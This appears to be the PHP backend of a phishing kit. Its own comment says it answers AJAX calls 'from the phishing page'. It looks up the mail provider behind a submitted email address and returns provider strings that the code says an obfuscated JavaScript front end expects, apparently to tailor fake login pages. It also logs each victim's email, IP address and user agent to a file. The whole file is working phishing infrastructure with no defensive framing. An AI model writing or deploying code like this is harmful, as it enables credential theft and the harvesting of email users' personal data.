<?php
// CORS headers to allow AJAX requests from the phishing page
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Authorization, Content-Type");
header('Content-Type: application/json');

// Enable error reporting for debugging (remove in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (isset($_GET['dom']) && !empty($_GET['dom'])) {
    $email = trim($_GET['dom']);
    
    // Extract domain from email (e.g., user@gmail.com -> gmail.com)
    if (strpos($email, '@') !== false) {
        $domain_name = substr(strrchr($email, "@"), 1);
    } else {
        $domain_name = trim($email); // Direct domain input
    }
    
    // Log request for debugging
    $log_data = [
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'email' => $email,
        'domain' => $domain_name,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ];
    file_put_contents('checker_requests.log', json_encode($log_data) . "\n", FILE_APPEND);
    
    // Try real MX lookup FIRST with proper error handling
    $mx_records = [];
    $mx_weights = [];
    $use_real_mx = false;
    
    if (function_exists('getmxrr')) {
        if (getmxrr($domain_name, $mx_records, $mx_weights)) {
            // Real MX records found - sort by priority (lowest weight first)
            $mx_pairs = array_combine($mx_weights, $mx_records);
            asort($mx_pairs);
            $primary_mx = reset($mx_pairs); // Get highest priority MX
            
            // Log real MX records found
            error_log("Real MX for $domain_name: " . json_encode($mx_records));
            $use_real_mx = true;
        } else {
            error_log("No MX records found for $domain_name");
        }
    } else {
        error_log("getmxrr function not available");
    }
    
    $success_value = 'none';
    
    if ($use_real_mx) {
        // For real MX records, check if they match known patterns
        $mx_string = strtolower($primary_mx);
        
        // Check against your JavaScript's expected patterns
        if (strpos($mx_string, 'google') !== false || strpos($mx_string, 'gmail') !== false) {
            $success_value = 'smtp.google.com';
        } elseif (strpos($mx_string, 'mta') !== false && strpos($mx_string, 'yahoodns') !== false) {
            // Yahoo MX variants
            $success_value = 'mta5.am0.yahoodns.net';
        } elseif (strpos($mx_string, 'gmx') !== false) {
            $success_value = 'mx00.gmx.net';
        } elseif (strpos($mx_string, 'outlook') !== false || strpos($mx_string, 'protection') !== false) {
            $success_value = 'mail.protection.outlook.com';
        } elseif (strpos($mx_string, 'zoho') !== false) {
            $success_value = 'mx.zoho.com';
        } elseif (strpos($mx_string, 'protonmail') !== false) {
            $success_value = 'mail.protonmail.ch';
        } elseif (strpos($mx_string, 'comcast') !== false) {
            $success_value = 'comcast.net';
        } else {
            // Use the real MX as fallback, but JavaScript might not recognize it
            $success_value = $primary_mx;
        }
    } else {
        // Fallback to EXACT matches your obfuscated JavaScript expects
        $provider_mx = [
            // Gmail - EXACT matches from your JS
            'gmail.com' => 'smtp.google.com',
            'googlemail.com' => 'smtp.google.com',
            
            // Yahoo - MUST be one of these exact strings
            'yahoo.com' => 'mta5.am0.yahoodns.net',
            'yahoo.co.uk' => 'mta5.am0.yahoodns.net',
            'yahoo.co.jp' => 'mta5.am0.yahoodns.net',
            'yandex.ru' => 'mta5.am0.yahoodns.net',
            
            // GMX
            'gmx.com' => 'mx00.gmx.net',
            'gmx.net' => 'mx00.gmx.net',
            'gmx.de' => 'mx00.gmx.net',
            
            // Microsoft/Outlook/Hotmail - EXACT matches
            'outlook.com' => 'mail.protection.outlook.com',
            'hotmail.com' => 'mail.protection.outlook.com',
            'live.com' => 'mail.protection.outlook.com',
            'msn.com' => 'microsoft-com.mail.protection.outlook.com',
            
            // iCloud/Apple
            'icloud.com' => 'icloud',
            'me.com' => 'icloud',
            'mac.com' => 'icloud',
            
            // AOL
            'aol.com' => 'mx-aol.mail.gm0.yahoodns.net',
            
            // Zoho
            'zoho.com' => 'mx.zoho.com',
            'zohomail.com' => 'mx.zoho.com',
            'zoho.eu' => 'mx.zoho.com',
            
            // ProtonMail
            'protonmail.com' => 'mail.protonmail.ch',
            'proton.me' => 'mail.protonmail.ch',
            
            // Mail.ru
            'mail.ru' => 'mail.ru',
            
            // Naver (Korea)
            'naver.com' => 'mx1.naver.com',
            
            // QQ/Tencent (China)
            'qq.com' => 'mx3.qq.com',
            'vip.qq.com' => 'mx3.qq.com',
            
            // NetEase (China) - 163, 126, etc.
            '163.com' => 'hzmx01.mxmail.netease.com',
            '126.com' => 'hzmx01.mxmail.netease.com',
            '188.com' => '188mx00.mxmail.netease.com',
            
            // Daum/Hanmail (Korea)
            'hanmail.net' => 'mx1.hanmail.net',
            'daum.net' => 'mx1.hanmail.net',
            
            // Comcast
            'comcast.net' => 'comcast.net',
            
            // Godaddy
            'godaddy.com' => 'secureserver.net',
            
            // 1and1/Ionos
            '1and1.com' => '1and1',
            'ionos.com' => 'ionos',
            'kundenserver.de' => 'kundenserver',
            
            // Rackspace
            'rackspace.com' => 'mx1.emailsrvr.com',
            
            // Default fallback
            'default' => 'none'
        ];
        
        $success_value = isset($provider_mx[$domain_name]) ? $provider_mx[$domain_name] : 'none';
    }
    
    // Debug log
    error_log("Final response for $domain_name: success = $success_value");
    
    $output = [
        'success' => $success_value
    ];
    
    echo json_encode($output);
    
} else {
    // Error response if no domain provided
    error_log("Checker.php: No domain parameter provided");
    echo json_encode([
        'error' => 'No domain parameter provided'
    ]);
}
?>